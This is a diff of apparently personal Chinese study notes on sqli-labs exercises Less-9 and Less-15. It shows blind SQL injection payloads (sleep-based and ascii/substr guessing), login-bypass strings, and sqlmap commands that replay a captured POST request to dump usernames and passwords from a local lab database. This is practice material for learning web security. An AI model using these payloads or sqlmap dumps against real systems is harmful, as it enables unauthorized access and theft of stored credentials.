@@ -95,7 +95,7 @@ GET /sqli-labs/Less-9/?id=1%27%20and%20if(ascii(substr((select%20column_name%20f
 - `limit 1,1` → `username`
 - `limit 2,1` → `password``
 GET /sqli-labs/Less-9/?id=1%27%20and%20if(ascii(substr((select%20username%20from%20users%20limit%200,1),1,1))>90,sleep(5),1)%23 HTTP/1.1继续猜username和passward
-（三）sqlmap
+##### （三）sqlmap
 ```
 py -3 sqlmap.py -u "http://127.0.0.1/sqli-labs/Less-9/?id=1" --technique=T -D security -T users -C username,password --batch
 ```
@@ -148,3 +148,42 @@ SELECT username,password FROM users WHERE username=("") or 1=1 *") AND password=
 ## 13post')
 闭合测试时候如果是错误的就没有回显；正确的回显示你的mysql语法错误
 1.相较于前两道题，这道题在绕过登陆时候没有回显
+## 15忙注
+1.先确认闭合+绕过
+2.猜长度
+```
+' or length(database())=8 #
+```
+![[Pasted image 20261120180539.png]]
+```
+' or ascii(substr((select 你要查的内容),第几位,1))=ascii数字 #
+```
+```
+eg 表名
+ ' or ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1))=101 #
+```
+3.sqlmap在D:\appuse\web\sqlmap-master\sqlmap.py
+先进入目录```
+cd D:\appuse\web\sqlmap-master```
+然后用不了，sqlmap不擅长处理有图片返回信息
+4.去burp里面抓包（一定是抓post包，也就是一级再username和passwaed输入信息后的网页抓包否则是get）比如我们都输入1，那么在请求主体里面我们就能看见
+![[Pasted image 20261120184607.png]]
+把raw里面都复制到sqlmap里新建文件夹less15里面。
+D:\appuse\web\sqlmap-master>py -3 sqlmap.py -r less15.txt -p uname --level=5 --risk=3 --sql-query="select username,password from security.users" --batch![[Pasted image 20261120191323.png]]运行完可以进行脱库（把数据拿到本地）
+```
+sqlmap -r post.txt -D security -T users --dump
+```
+- `-r less15.txt`：读取你 Burp 抓的 POST 包
+- `-D security`：指定数据库
+- `-T users`：指定表
+- `--dump`：导出数据
+- `--time-sec=2`：时间盲注延迟 2 秒（Less15 适合）
+- `--batch`：自动默认回答，不用手动输 y
+ ![[Pasted image 20261120200144.png|296]]
+ dump里面保存的是数据
+ ![[Pasted image 20261120200246.png|291]]
+log是注入原始记录；
+session.sqlite（核心会话库） sqlite 数据库文件，存着 sqlmap 已经猜出来的所有结                 果跑同一个目标，sqlmap 直接读这个文件，不会从头重新盲注，节省时间；session.sqlite-shm、session.sqlite-wal这两个是 sqlite 的临时日志文件
+         - `-wal`：Write-Ahead Log，预写日志，正在写入数据的时候，数据先存在这里
+         - `-shm`：共享内存文件，用来同步读写 程序正常结束后，这两个一般会自动合并回 session.sqlite；中途强制 Ctrl+C 关掉 sqlmap，它们会留在目录里。
+**==🟡记得下次输出时候把它弄到d盘文件夹里，否则就在默认c盘appdata里==**
